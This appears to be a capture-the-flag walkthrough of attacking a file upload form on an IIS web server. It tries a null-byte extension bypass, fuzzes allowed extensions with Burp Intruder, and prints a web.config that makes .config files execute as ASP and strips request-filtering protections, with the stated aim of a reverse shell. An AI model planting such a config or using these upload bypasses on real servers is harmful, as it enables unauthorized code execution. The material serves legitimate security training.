I found transfer.aspx page and uploadedfiles page. We might upload some file to the target machine.

As I assumed, I found file upload form. We have to check which file extensions we can upload.

After testing several file extensions, I found png file or other image file extenstions are accepted. Next, we have to check if we can upload aspx file by appending %00.png to the aspx file.

I changed the file extension appending %00.png. Then, this file uploaded successfully. However, navigating to the page /fileuploaded/test.aspx doesn't return the file.

We may other file extension we can upload. Let's test it.

First, we need to create file extension wordlist.

curl -sL 'https://msdn.microsoft.com/en-us/library/2wawkw1c.aspx' \
  | grep -oP '(?i)(?<=<p>).*?(?=</p>)' \
  | tr ' ' '\n' \
  | grep '^\.' \
  | tr -d ',' > iis_extensions.txt

Then, resend upload request with any file and send it to intruder.

Press add button and load wordlist we made before to modify filename. Note that uncheck the box URL-encode these characters. It encodes . into %2e, which is url encoded for dot and interrupt our test.

Intruder suggest that the config file can be uploaded since the length of response is shorter than others.

Because we can include and execute aspx code in config file, we can get reverse shell with it.

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
